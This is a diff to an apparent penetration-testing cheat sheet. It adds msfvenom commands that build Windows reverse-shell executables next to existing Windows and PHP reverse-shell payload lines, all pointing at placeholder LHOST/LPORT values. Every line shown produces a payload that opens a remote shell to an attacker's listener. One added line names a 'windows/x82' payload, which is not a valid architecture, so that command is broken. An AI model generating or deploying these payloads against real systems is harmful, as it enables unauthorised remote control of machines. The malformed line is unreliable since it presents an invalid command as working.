@@ -338,6 +338,10 @@ Starting / Stopping the Service
 
 <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe > shell.exe</code>
 
+<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe > shell.exe</code>
+
+<code>msfvenom -p windows/x82/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe > shell.exe</code>
+
 ### PHP
 
 <code>msfvenom -p php/reverse_php LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.php</code>
